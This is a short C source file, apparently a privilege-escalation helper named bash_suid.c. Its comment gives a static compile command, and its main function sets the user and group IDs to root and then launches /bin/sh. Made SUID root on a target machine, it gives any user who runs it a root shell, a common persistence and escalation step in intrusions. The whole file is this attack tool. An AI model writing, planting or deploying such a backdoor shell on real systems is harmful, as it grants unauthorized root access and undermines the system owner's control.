// Compile with
// gcc bash_suid.c -o bash_suid_amd64 -static
#include <stdio.h>
#include <unistd.h>

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL);
}
